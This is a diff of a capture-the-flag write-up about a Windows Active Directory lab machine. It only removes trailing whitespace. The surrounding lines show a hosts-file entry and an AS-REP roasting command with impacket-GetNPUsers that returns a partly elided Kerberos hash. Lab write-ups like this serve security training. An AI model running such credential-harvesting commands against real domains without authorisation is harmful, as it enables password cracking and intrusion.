@@ -43,7 +43,7 @@ There are many open ports, which are common on windows-based challenges.
 Let's add the domain name in our hosts file.
 
 ```bash
-kali@kali:cat /etc/hosts                                                                                                                    
+kali@kali:cat /etc/hosts
 10.48.152.148   vulnnet-rst.local
 
 127.0.0.1       localhost
@@ -99,8 +99,8 @@ Password:
 We get some usernames, let's save them in a text file, and see if they have no preauth set.
 
 ```bash
-kali@kali:impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.48.152.148                                         
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.48.152.148
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
 $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:e7dbd6706.....1695b48e222d59ded
